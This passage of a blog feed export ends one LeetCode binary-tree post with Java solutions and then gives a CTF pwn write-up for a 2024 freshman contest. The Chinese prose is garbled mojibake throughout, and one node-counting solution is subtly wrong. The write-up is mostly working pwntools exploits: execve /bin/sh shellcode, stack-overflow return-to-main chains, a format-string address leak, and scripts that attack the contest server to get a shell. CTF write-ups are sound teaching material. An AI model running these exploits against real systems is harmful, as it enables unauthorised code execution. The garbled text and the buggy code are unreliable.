‘æœ‰è‡³å°‘ä¸€å±‚åˆ†æ”¯çš„åŸºç¡€ä¸Šï¼Œæœ€å°æ·±åº¦å°±ä¸ä¼šæ˜¯1äº†.</p><h6 id="é€’å½’-1"><a href="#é€’å½’-1" class="headerlink" title="é€’å½’"></a>é€’å½’</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> getHeight(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftHeight</span> <span class="operator">=</span> getHeight(node.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightHeight</span> <span class="operator">=</span> getHeight(node.right);</span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="literal">null</span> &amp;&amp; node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> rightHeight + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> leftHeight + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> leftHeight&gt;rightHeight?rightHeight+<span class="number">1</span>:leftHeight+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å®Œå…¨äºŒå‰æ ‘èŠ‚ç‚¹ä¸ªæ•°"><a href="#å®Œå…¨äºŒå‰æ ‘èŠ‚ç‚¹ä¸ªæ•°" class="headerlink" title="å®Œå…¨äºŒå‰æ ‘èŠ‚ç‚¹ä¸ªæ•°"></a>å®Œå…¨äºŒå‰æ ‘èŠ‚ç‚¹ä¸ªæ•°</h4><p>linkï¼š<a href="https://leetcode.cn/problems/count-complete-tree-nodes/submissions/">222. å®Œå…¨äºŒå‰æ ‘çš„èŠ‚ç‚¹ä¸ªæ•° - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-2"><a href="#æ€è·¯åˆ†æ-2" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>é¦–å…ˆæƒ³åˆ°çš„æ˜¯åœ¨ä¹‹å‰æ·±åº¦çš„åŸºç¡€ä¸Šï¼Œéå†è®¡æ•°èŠ‚ç‚¹ï¼Œåˆ©ç”¨å®Œå…¨äºŒå‰æ ‘çš„æ€§è´¨ï¼Œå·¦å­æ ‘çš„é«˜åº¦ä¸€å®šæ˜¯å¤§äºç­‰äºå³å­æ ‘çš„é«˜åº¦ï¼Œæ‰€ä»¥æˆ‘ä»¬éå†åªéœ€è¦åˆ¤æ–­å·¦å­æ ‘å°±è¡Œ.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getNum(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> node.left;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> node.right;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightDepth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(right != <span class="literal">null</span>) &#123;</span><br><span class="line">            right = right.right;</span><br><span class="line">            leftDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(left != <span class="literal">null</span>) &#123;</span><br><span class="line">            left = left.left;</span><br><span class="line">            leftDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(leftDepth == rightDepth) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">2</span> &gt;&gt; leftDepth) - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftnum</span> <span class="operator">=</span> getNum(node.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightnum</span> <span class="operator">=</span> getNum(node.right);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> leftnum + rightnum + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¼˜åŒ–ç‰ˆ</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getNumber(root);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNumber</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è®¡ç®—å·¦å­æ ‘çš„æ·±åº¦</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> getDepth(node.left);</span><br><span class="line">        <span class="comment">// è®¡ç®—å³å­æ ‘çš„æ·±åº¦</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rightDepth</span> <span class="operator">=</span> getDepth(node.right);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å¦‚æœå·¦å­æ ‘å’Œå³å­æ ‘çš„æ·±åº¦ç›¸ç­‰ï¼Œè¯´æ˜æ˜¯å®Œå…¨äºŒå‰æ ‘</span></span><br><span class="line">        <span class="keyword">if</span> (leftDepth == rightDepth) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; leftDepth) + getNumber(node.right); <span class="comment">// 2^leftDepth + å³å­æ ‘çš„èŠ‚ç‚¹æ•°</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; rightDepth) + getNumber(node.left); <span class="comment">// 2^rightDepth + å·¦å­æ ‘çš„èŠ‚ç‚¹æ•°</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è®¡ç®—æ ‘çš„æ·±åº¦</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getDepth</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">            depth++;</span><br><span class="line">            node = node.left; <span class="comment">// åªè®¡ç®—å·¦å­æ ‘çš„æ·±åº¦</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024CUDSECæ–°ç”Ÿèµ›</title>
      <link href="/2024/11/09/2024CUDSEC%E6%96%B0%E7%94%9F%E8%B5%9B/"/>
      <url>/2024/11/09/2024CUDSEC%E6%96%B0%E7%94%9F%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h4 id="CUDSECâ€”â€”ç¬¬ä¸ƒå±Šâ€ç„æ­¦æ¯â€Pwnæ–¹å‘WP"><a href="#CUDSECâ€”â€”ç¬¬ä¸ƒå±Šâ€ç„æ­¦æ¯â€Pwnæ–¹å‘WP" class="headerlink" title="CUDSECâ€”â€”ç¬¬ä¸ƒå±Šâ€ç„æ­¦æ¯â€Pwnæ–¹å‘WP"></a>CUDSECâ€”â€”ç¬¬ä¸ƒå±Šâ€ç„æ­¦æ¯â€Pwnæ–¹å‘WP</h4><h3 id="sign"><a href="#sign" class="headerlink" title="sign"></a>sign</h3><p>ç­¾åˆ°é¢˜æ²¡ä»€ä¹ˆå¥½è¯´çš„ flagå†™åœ¨ç¨‹åºé‡Œ æ‹–è¿›IDAç§’.</p><h3 id="easy-shell"><a href="#easy-shell" class="headerlink" title="easy_shell"></a>easy_shell</h3><p>ç®—åŠ å¼ºç‰ˆç­¾åˆ°äº† è¿è¡Œç¨‹åºçœ‹åˆ°<br><img src="/../imgs/2024-10/image-20241109125426328.png" alt="image-20241109125426328"></p><p>æç¤ºç»™äº†shell é‚£æ˜¯æä¾›äº†åé—¨çš„ï¼ˆè¿›IDAåˆ†æä¹Ÿèƒ½çœ‹åˆ°ï¼‰<br>ç›´æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls 1&gt;&amp;0</span><br></pre></td></tr></table></figure><p><img src="/../imgs/2024-10/image-20241109125715321.png" alt="image-20241109125715321"></p><p>æ‰“è¿œç¨‹åŠ ä¸ŠflagæŸ¥çœ‹å°±å¥½äº†.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag 1&gt;&amp;0</span><br></pre></td></tr></table></figure><p>å¦‚æœè¯´ä¸ºä»€ä¹ˆå‡ºè¿™ä¸ªæ„Ÿè§‰ä¸æ²¾è¾¹ é—®å°±æ˜¯ä¹‹å‰ç»™æ–°åŒå­¦ä»¬å¸ƒç½®è¿‡ç›¸å…³å­¦ä¹ ä»»åŠ¡ è€ƒå¯Ÿä¸€ä¸‹ï¼ˆæ¬¢è¿éé¢„æœŸçš„ä½¬ä»¬äº¤æµ~</p><h3 id="only-chance"><a href="#only-chance" class="headerlink" title="only_chance"></a>only_chance</h3><p>è¿™é¢˜æœ‰å­¦å¼Ÿå¡åœ¨ç¬¬äºŒæ¬¡åœ°å€æ¥æ”¶ å…¶å®ä¸»è¦è¿˜æ˜¯æ ˆçš„å·¥ä½œåŸç†ç†è§£çš„ä¸æ˜¯ç‰¹åˆ«é€å½»ï¼ˆåæ€ing</p><p>è¿è¡Œå…¶å®å°±æœ‰æç¤ºæ²¡æœ‰åé—¨æ€ä¹ˆæ å…«æˆè¦è‡ªå·±æ„é€ shellcodeå¤šæ‰“å‡ æ¬¡<br>IDAåˆ†æå‘ç°gets sçš„å¤§å°æ˜¯280 è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºé‡å®šå‘åˆ°mainè¿›è¡Œç¬¬äºŒæ¬¡ç¨‹åºè¿è¡Œæ‰§è¡Œshellcode<br>ä½¿ç”¨NOP sledç¡®ä¿åœ¨è¿”å›åˆ° shellcode æ—¶ï¼Œå³ä½¿ä½ç½®åç§»ï¼Œç¨‹åºä¹Ÿä¼šâ€œæ»‘è¡Œâ€åˆ°æœ‰æ•ˆçš„æŒ‡ä»¤åŒºåŸŸï¼ˆ2048ä¹Ÿ111ï¼‰</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;arm64&#x27;</span>, os = <span class="string">&#x27;Linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./oneChance&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = e.symbols[<span class="string">&#x27;main&#x27;</span>] + <span class="number">1</span></span><br><span class="line">offset = <span class="number">280</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] main_addr:&#x27;</span>, <span class="built_in">hex</span>(main))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] offest:&#x27;</span>, <span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€ payload1ï¼Œ retåˆ°mainå¤´ï¼Œè·å–ç¬¬äºŒæ¬¡è¾“å…¥æœºä¼š</span></span><br><span class="line">payload1 = offset * <span class="string">b&#x27;a&#x27;</span> + p64(main)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./oneChance&#x27;</span>)</span><br><span class="line"><span class="comment"># = remote(&#x27;127.0.0.1&#x27;,8888)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;where are them\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ ˆé¡¶åœ°å€</span></span><br><span class="line">stack = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) + <span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;[+] stack:&#x27;</span>, <span class="built_in">hex</span>(stack))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">0x50</span>   <span class="comment"># å…ˆå¡«å……nopé“¾</span></span><br><span class="line">payload2 += shellcode       <span class="comment"># æ‰§è¡Œshellcode</span></span><br><span class="line">payload2 += <span class="string">b&#x27;a&#x27;</span> * (offset - <span class="built_in">len</span>(shellcode) - <span class="number">0x50</span>)     <span class="comment"># å¡«å……å®Œå‰©ä½™æ ˆåŒº</span></span><br><span class="line">payload2 += p64(stack)      <span class="comment"># ret: å›åˆ°æ ˆé¡¶ï¼Œå¼€å§‹æ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ä¹Ÿæœ‰å¸ˆå‚…æ˜¯shellcodeæ¥å—æ ˆåœ°å€ ç„¶åæ§åˆ¶ç¨‹åºæµæ‰§è¡Œåˆ°shellcode å°±å¯ä»¥æ‹¿åˆ°shelläº† æ¯”æˆ‘è¿™ä¸ªç²¾ç®€å¤šäº†.ä¸‹é™„Rå¸ˆå‚…çš„æ€è·¯.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#p=process(&#x27;./one_chance&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">49494</span>)</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./one_chance&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401463</span></span><br><span class="line">gets_plt=elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x110</span>+p64(<span class="number">0x404500</span>)+p64(ret)+p64(<span class="number">0x401360</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;I&#x27;ll tell where are them\n&quot;</span>,payload)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(stack))</span><br><span class="line">shell=shellcraft.sh()</span><br><span class="line">shell=asm(shell)</span><br><span class="line">payload=shell.ljust(<span class="number">0x118</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(stack)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;I&#x27;ll tell where are them\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h3><p>å¦‚æœä½ æ˜¯2048é«˜æ‰‹ é‚£è¿™é¢˜çœŸçš„å°±æ˜¯é€äº† ä½†æ˜¯æ„Ÿè§‰æœ‰ç‚¹é—æ†¾ æ²¡æœ‰å¾ˆå¤šå¸ˆå‚…çš„åé¦ˆå‘œå‘œï¼ˆä¹Ÿå¯èƒ½æ˜¯æœ‰äº›å¸ˆå‚…è§‰å¾—å¤ªeasyä¸å±‘ä¸€é¡¾hh ğŸ¤©<br>å…¶å®ä¸»è¦æ˜¯ä¸€ä¸ªéé¢„æœŸå¡«å……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">xt.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./p2048&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="number">22770</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;z&#x27;</span> * (<span class="number">1024</span> + <span class="number">28</span>)  + <span class="string">b&#x27;\n&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;w&#x27;</span><span class="comment">#éé¢„æœŸå¡«å……</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># äº¤äº’æ¨¡å¼</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>Hintæ˜¯æ ˆå’Œæ ¼å¼åŒ–å­—ç¬¦ä¸² éœ€è¦debug<br>è²Œä¼¼è¿™é¢˜å­˜åœ¨äº›ç–‘é—® å¸Œæœ›æœ‰é—®é¢˜çš„å¸ˆå‚…å¯ä»¥ä¸‹æ¥ä¸€èµ·äº¤æµï¼ˆlose æˆ‘æ˜¯èœèœfw</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;nc1.ctfplus.cn&#x27;,40454)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;hey, what&#x27;s your name? : &quot;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%10$p&quot;</span>+<span class="string">b&quot;A&quot;</span>*<span class="number">3</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">shellcode_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;AAA&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;to exit? (y/n)&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;hello \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">24</span>+p64(shellcode_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0x1</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x1/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x1/</url>
      
